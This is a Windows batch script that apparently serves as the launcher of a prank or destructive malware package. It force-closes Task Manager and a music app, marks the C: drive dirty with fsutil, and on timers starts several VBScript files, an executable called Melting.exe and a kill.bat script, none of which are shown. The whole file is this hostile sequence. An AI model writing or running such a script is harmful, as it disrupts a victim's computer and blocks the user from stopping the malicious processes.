@echo off
taskkill /f /im Music.UI.exe
start volume.vbs
start rest4.vbs
timeout /t 5
start alhmar.vbs
taskkill /f /im taskmgr.exe
fsutil dirty set C:
timeout /t 14
start volume.vbs
start rest2.vbs
start rest3.vbs
start Melting.exe
timeout /t 3
start rsd.vbs
start kill.bat
timeout /t 5
start rspamprs.vbs

